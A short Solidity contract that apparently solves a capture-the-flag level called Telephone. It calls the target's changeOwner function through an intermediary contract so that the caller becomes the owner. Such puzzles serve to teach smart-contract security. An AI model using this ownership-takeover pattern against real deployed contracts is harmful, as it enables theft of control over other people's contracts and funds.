// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Telephone.sol";

contract SolveTelephone{
    
    Telephone public tel;

    constructor(address _telephone){
        tel = Telephone(_telephone);
    }
    function callTelephone(address _myAddress) public{
        tel.changeOwner(_myAddress);
    }
}